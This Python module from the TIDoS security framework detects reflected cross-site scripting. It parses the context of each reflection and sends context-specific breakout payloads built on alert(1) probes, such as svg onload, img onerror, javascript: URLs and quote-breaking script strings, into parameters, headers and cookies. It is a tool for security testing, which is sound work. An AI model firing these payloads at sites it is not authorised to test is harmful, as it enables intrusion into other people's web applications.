#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#
#

#-:-:-:-:-:-:-:-:-:-:-:-:#
#    TIDoS Framework     #
#-:-:-:-:-:-:-:-:-:-:-:-:#

#This module requires TIDoS Framework
#https://github.com/0xInfection/TIDoS-Framework

"""
Reflected XSS detection engine (used by modules/VlnAnalysis/Severe/xss.py).

1. Inject a random marker and find where it is reflected.
2. Work out the HTML context of each reflection with a small HTML/JS state
   machine: text, comment, attribute name / quoted / unquoted value, script
   code / string / template literal, RCDATA/RAWTEXT elements (textarea,
   title, style...).
3. Send breakout payloads that fit that context and accept a finding only
   when the payload comes back unencoded AND the injected handler / code
   sits in an executable position of the *response* (e.g. `onload=` parsed
   as an attribute name of a real tag, `alert(1)` outside any JS string).
   A second request with a fresh marker must reproduce it.

Encoded reflections (&lt; &quot; \\" \\u003c...) never satisfy step 3.
Non-HTML responses (JSON, text/plain...) are skipped.
"""

from __future__ import annotations

import re
from dataclasses import dataclass

from core.methods import inject

_TAG = re.compile(r"<(/?)([a-zA-Z][a-zA-Z0-9:-]*)")
_ATTR_NAME = re.compile(r"[^\s/>=\"'<][^\s/>=\"'<]*")
_UNQUOTED = re.compile(r"[^\s>]*")
_RAW = ("script", "style", "textarea", "title", "xmp", "iframe", "noembed", "noframes", "noscript")
URL_ATTRS = ("href", "src", "action", "formaction", "data", "xlink:href")


@dataclass(frozen=True)
class Context:
    kind: str          # html | comment | attrname | attr | raw | js-code | js-string | js-comment
    quote: str = ""    # attribute / JS string quote ("" = unquoted attribute)
    tag: str = ""      # element name (raw / attribute contexts)
    attr: str = ""     # attribute name
    start: int = -1    # offset where the attribute value / JS string starts

    def __str__(self) -> str:
        if self.kind == "attr":
            q = {"": "unquoted", '"': "double-quoted", "'": "single-quoted"}[self.quote]
            return f"{q} attribute {self.tag}[{self.attr}]"
        if self.kind == "js-string":
            return f"JavaScript string ({self.quote})"
        if self.kind == "raw":
            return f"<{self.tag}> content"
        return {"html": "HTML text", "comment": "HTML comment", "attrname": f"<{self.tag}> attribute list",
                "js-code": "JavaScript code", "js-comment": "JavaScript comment"}.get(self.kind, self.kind)


def _js_context(body: str, start: int, pos: int) -> Context:
    """State of JS source body[start:pos]."""
    i, state, quote = start, "code", ""
    while i < pos:
        ch = body[i]
        if state == "code":
            if ch in "'\"`":
                state, quote, qstart = "string", ch, i + 1
            elif body.startswith("//", i) or body.startswith("<!--", i):
                end = body.find("\n", i)
                if end == -1 or end >= pos:
                    return Context("js-comment", tag="script")
                i = end
            elif body.startswith("/*", i):
                end = body.find("*/", i + 2)
                if end == -1 or end + 2 > pos:
                    return Context("js-comment", tag="script")
                i = end + 1
        elif state == "string":
            if ch == "\\":
                i += 1
            elif ch == quote:
                state = "code"
            elif ch == "\n" and quote != "`":
                state = "code"  # unterminated string ends the line (syntax error anyway)
        i += 1
    if state == "string":
        return Context("js-string", quote=quote, tag="script", start=qstart)
    return Context("js-code", tag="script")


def context_at(body: str, pos: int) -> Context:
    """Parsing state of `body` right before offset `pos`."""
    i = 0
    while i < pos:
        lt = body.find("<", i)
        if lt == -1 or lt >= pos:
            return Context("html")
        i = lt
        if body.startswith("<!--", i):
            end = body.find("-->", i + 4)
            if end == -1 or end + 3 > pos:
                return Context("comment")
            i = end + 3
            continue
        if body.startswith(("<!", "<?"), i):
            end = body.find(">", i)
            if end == -1 or end >= pos:
                return Context("comment")
            i = end + 1
            continue
        m = _TAG.match(body, i)
        if not m:
            i += 1
            continue
        closing, tag = m.group(1) == "/", m.group(2).lower()
        j = m.end()
        if j > pos:
            return Context("html")  # inside the tag name itself
        # attribute list
        while True:
            while j < len(body) and (body[j].isspace() or body[j] == "/"):
                j += 1
            if j >= pos:
                return Context("attrname", tag=tag)
            if body[j] == ">":
                j += 1
                break
            n = _ATTR_NAME.match(body, j)
            if not n:
                j += 1
                continue
            name, j = n.group(0).lower(), n.end()
            if j > pos:
                return Context("attrname", tag=tag)
            k = j
            while k < len(body) and body[k].isspace():
                k += 1
            if k >= len(body) or body[k] != "=":
                continue
            k += 1
            while k < len(body) and body[k].isspace():
                k += 1
            if k < len(body) and body[k] in "\"'":
                q = body[k]
                end = body.find(q, k + 1)
                end = len(body) if end == -1 else end
                if k < pos <= end:
                    return Context("attr", quote=q, tag=tag, attr=name, start=k + 1)
                j = end + 1
            else:
                v = _UNQUOTED.match(body, k)
                if k <= pos < max(v.end(), k + 1):
                    return Context("attr", quote="", tag=tag, attr=name, start=k)
                j = v.end()
        i = j
        if not closing and tag in _RAW:
            close = re.compile(r"</%s[\s/>]" % re.escape(tag), re.I).search(body, j)
            end = close.start() if close else len(body)
            if pos <= end:
                if tag == "script":
                    return _js_context(body, j, pos)
                return Context("raw", tag=tag)
            i = end
    return Context("html")


# --------------------------------------------------------------------------
# payloads per context
# --------------------------------------------------------------------------
# each entry: (payload template with {t} = token, anchor substring, expected
# context kind at the anchor). The payload is accepted only if the anchor of a
# verbatim reflection is parsed in that context.

_TAG_PAYLOADS = [
    ("<svg onload=alert(1) id={t}>", "onload=alert(1) id={t}", "attrname"),
    ("<img src=x onerror=alert(1) id={t}>", "onerror=alert(1) id={t}", "attrname"),
    ("<details open ontoggle=alert(1) id={t}>", "ontoggle=alert(1) id={t}", "attrname"),
]


def payloads_for(ctx: Context) -> list[tuple[str, str, str]]:
    out: list[tuple[str, str, str]] = []

    def breakout(prefix: str):
        out.extend((prefix + p, a, k) for p, a, k in _TAG_PAYLOADS)

    if ctx.kind == "html":
        breakout("")
    elif ctx.kind == "comment":
        breakout("-->")
    elif ctx.kind == "raw":
        breakout(f"</{ctx.tag}>")
    elif ctx.kind == "attrname":
        out.append((" onmouseover=alert(1) id={t} ", "onmouseover=alert(1) id={t}", "attrname"))
        breakout(">")
    elif ctx.kind == "attr":
        q = ctx.quote
        if q:
            out.append((f"{q} autofocus onfocus=alert(1) id={q}{{t}}", "onfocus=alert(1)", "attrname"))
            breakout(f"{q}>")
        else:
            out.append((" autofocus onfocus=alert(1) id={t}", "onfocus=alert(1) id={t}", "attrname"))
            breakout(">")
        if ctx.attr in URL_ATTRS:
            out.insert(0, ("javascript:alert(1)//{t}", "javascript:alert(1)//{t}", "url"))
        if ctx.attr.startswith("on"):
            out.insert(0, ("alert(1)//{t}", "alert(1)//{t}", "handler"))
    elif ctx.kind == "js-string":
        q = ctx.quote
        if q == "`":
            out.append(("${{alert(1)}}{t}", "${{alert(1)}}{t}", "js-string"))
        else:
            out.append((f"{q};alert(1);//{{t}}", "alert(1);//{t}", "js-code"))
            out.append((f"{q}-alert(1)-{q}{{t}}", "alert(1)-", "js-code"))
        breakout("</script>")
    elif ctx.kind == "js-code":
        out.append((";alert(1);//{t}", "alert(1);//{t}", "js-code"))
        breakout("</script>")
    elif ctx.kind == "js-comment":
        out.append(("\nalert(1);//{t}", "alert(1);//{t}", "js-code"))
        breakout("</script>")
    return out


def executable(body: str, anchor: str, kind: str, ctx: Context) -> bool:
    """Is some verbatim occurrence of `anchor` parsed in the expected context?"""
    for m in re.finditer(re.escape(anchor), body):
        got = context_at(body, m.start())
        if kind == "url":
            if got.kind == "attr" and got.attr in URL_ATTRS and got.start == m.start():
                return True
        elif kind == "handler":
            if got.kind == "attr" and got.attr.startswith("on"):
                return True
        elif kind == "js-string":
            if got.kind == "js-string" and got.quote == "`":
                return True
        elif got.kind == kind:
            return True
    return False


def is_html(resp) -> bool:
    ctype = (resp.headers.get("Content-Type") or "").lower()
    return not ctype or "html" in ctype


def reflections(body: str, token: str) -> list[Context]:
    """Distinct contexts in which `token` is reflected."""
    seen = []
    for m in re.finditer(re.escape(token), body):
        ctx = context_at(body, m.start())
        if ctx not in seen:
            seen.append(ctx)
    return seen


def make_check(session):
    def check(point):
        token = inject.marker()
        r = point.send(session, token)
        if r is None or not is_html(r):
            return []
        contexts = reflections(inject.text(r), token)
        for ctx in contexts:
            for template, anchor, kind in payloads_for(ctx):
                tok = inject.marker()
                payload, anc = template.format(t=tok), anchor.format(t=tok)
                resp = point.send(session, payload)
                if resp is None or not is_html(resp) or not executable(inject.text(resp), anc, kind, ctx):
                    continue
                tok2 = inject.marker()
                resp2 = point.send(session, template.format(t=tok2))
                if resp2 is None or not executable(inject.text(resp2), anchor.format(t=tok2), kind, ctx):
                    continue
                where = {"attrname": "as an attribute of a real tag", "js-code": "as JavaScript code",
                         "url": "as the start of a URL attribute", "handler": "inside an event handler",
                         "js-string": "inside a template literal"}[kind]
                return [inject.Finding(point, payload,
                                       f"[confirmed] reflected in {ctx}; payload returned unencoded, "
                                       f"'{anc}' parsed {where}", "Reflected XSS")]
        return []
    return check


# --------------------------------------------------------------------------
# header reflection points
# --------------------------------------------------------------------------

@dataclass(frozen=True)
class HeaderPoint:
    """Duck-typed inject.Point that injects into a request header or cookie."""
    url: str
    header: str            # User-Agent, Referer or Cookie
    cookie: str = ""       # cookie name when header == "Cookie"
    method: str = "GET"
    original: str = ""

    @property
    def name(self) -> str:
        return f"cookie {self.cookie}" if self.cookie else f"header {self.header}"

    def send(self, session, value: str, append: bool = False, raw: bool = False, **kw):
        try:
            if self.cookie:
                return session.get(self.url, headers={"Cookie": f"{self.cookie}={value}"}, **kw)
            return session.get(self.url, headers={self.header: value}, **kw)
        except Exception:
            return None

    def __str__(self) -> str:
        return f"GET {self.url} [{self.name}]"


def header_points(session, urls: list[str]) -> list[HeaderPoint]:
    """User-Agent / Referer points for each URL, plus cookies the URL sets."""
    out = []
    for url in urls:
        out += [HeaderPoint(url, "User-Agent"), HeaderPoint(url, "Referer")]
        try:
            r = session.get(url)
            names = list(dict.fromkeys(c.name for c in r.cookies))
        except Exception:
            names = []
        out += [HeaderPoint(url, "Cookie", n) for n in names]
    return out
